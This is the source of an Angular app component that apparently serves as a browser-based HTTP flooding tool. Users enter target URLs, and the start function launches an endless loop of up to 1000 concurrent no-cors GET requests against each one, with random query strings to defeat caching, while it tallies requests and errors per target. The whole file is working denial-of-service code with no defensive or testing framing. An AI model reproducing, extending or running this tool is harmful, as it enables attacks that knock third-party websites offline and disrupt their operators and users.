import { Component } from '@angular/core';
@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css'],
})
export class AppComponent {
  targets: string[] = [];
  queue: any[] = [];
  targetStats: any;
  url: string = '';

  private readonly CONCURRENCY_LIMIT = 1000;

  fetchWithTimeout(resource: any, options: any) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);
    return fetch(resource, {
      method: 'GET',
      mode: 'no-cors',
      signal: controller.signal,
    })
      .then((response) => {
        clearTimeout(id);
        return response;
      })
      .catch((error) => {
        clearTimeout(id);
        throw error;
      });
  }

  flood = async (target: any) => {
    for (var i = 0; ; ++i) {
      if (this.queue.length > this.CONCURRENCY_LIMIT) {
        await this.queue.shift();
      }
      const rand = i % 3 === 0 ? '' : '?' + Math.random() * 1000;
      this.queue.push(
        this.fetchWithTimeout(target + rand, { timeout: 1000 })
          .catch((error) => {
            if (error.code === 20 /* ABORT */) {
              return;
            }
            this.targetStats = this.targetStats.map((targetObj: any) => {
              return {
                ...targetObj,
                requests:
                  target === targetObj.target
                    ? targetObj.requests + 1
                    : targetObj.requests,
              };
            });
          })
          .then((response) => {
            if (response && !response.ok) {
              this.targetStats = this.targetStats.map((targetObj: any) => {
                return {
                  ...targetObj,
                  errors:
                    target === targetObj.target
                      ? targetObj.errors + 1
                      : targetObj.errors,
                };
              });
            }
            this.targetStats = this.targetStats.map((targetObj: any) => {
              return {
                ...targetObj,
                requests:
                  target === targetObj.target
                    ? targetObj.requests + 1
                    : targetObj.requests,
              };
            });
          })
      );
    }
  };

  add(): void {
    if (!this.url) {
      return;
    }
    this.targets.push(this.url);
    this.url = '';
  }

  start(): void {
    this.targetStats = this.targets.map((target: string) => {
      return {
        target,
        requests: 0,
        errors: 0,
      };
    });

    this.targets.map(this.flood);
  }

  delete(target: string): void {
    this.targets = this.targets.filter((tar) => tar !== target);
  }
}
